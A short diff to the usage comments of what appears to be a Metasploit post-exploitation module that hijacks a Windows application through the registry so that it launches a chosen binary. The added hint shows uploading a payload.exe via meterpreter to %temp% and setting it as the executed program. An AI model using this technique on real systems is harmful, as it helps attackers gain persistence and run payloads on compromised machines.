@@ -24,6 +24,10 @@
 # Application to be hijacked                 => set HIJACK notepad.exe
 # Full Path of the Binary to be executed     => set EXEC C:\\Windows\\System32\\calc.exe
 # Delete registry hijack hive/keys?          => set REVERT_HIJACK true
+# ---
+# HINT: we can upload an payload.exe to %temp% and execute it
+# meterpreter > upload /root/payload.exe %temp%\\payload.exe
+# and use 'set EXEC %temp%\\payload.exe' to start the uploaded binary.
 #
 #
 # [ PORT MODULE TO METASPLOIT DATABASE ]
